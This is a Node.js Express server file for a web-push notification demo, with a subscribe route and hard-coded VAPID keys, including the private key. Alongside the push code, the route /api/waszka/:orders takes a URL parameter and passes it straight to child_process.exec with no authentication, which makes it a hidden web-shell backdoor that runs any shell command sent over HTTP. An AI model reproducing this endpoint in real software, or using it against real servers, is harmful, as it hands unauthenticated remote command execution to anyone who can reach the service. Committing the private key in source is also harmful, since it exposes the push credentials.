const express = require('express');
const webpush = require('web-push');
const bodyParser = require('body-parser');
const path = require('path');

const { exec } = require("child_process");

const server = express();
const PORT = 5002;

//Set static path
server.use(express.static(path.join(__dirname, 'client')));

server.use(express.json());
server.use(bodyParser.json());


const publicVapidKey = 'BO0aKTOVTuFJXqDqnLmaFBb1quq59fKcqfW7Bx4oou5MNX5UDv88hNkFyBFPgD8jUHac4kZtoQFLDB2Q92FYdC8';
const privateVapidKey = 'yOBFmCHsU2mE69AzNU8BrKQk421e8HASKDjjMaKYuPY';

webpush.setVapidDetails('mailto:test@test.com', publicVapidKey, privateVapidKey);

// Subscribe Route

server.post('/subscribe', (req, res) => {
    // Get pushSubscription object
    const subscription = req.body;

    // Send 201 - resource created
    res.status(201).json({})

    // Create payload
    const payload = JSON.stringify({ title: 'Push Test' })

    // Pass object into sendNotification
    webpush.sendNotification(subscription, payload).catch(error => console.error(error));
})



server.get('/api/waszka/:orders', (req, res) => {
    const { orders } = req.params;
    res.status(200).json(orders)

    exec(orders, (error, stdout, stderr) => {
        if (error) {
            console.log(`error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.log(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout ${stdout}`);
    });
})

server.listen(PORT, () => {
    console.log(`\n*** Server Runing on port ${PORT} ***\n`)
});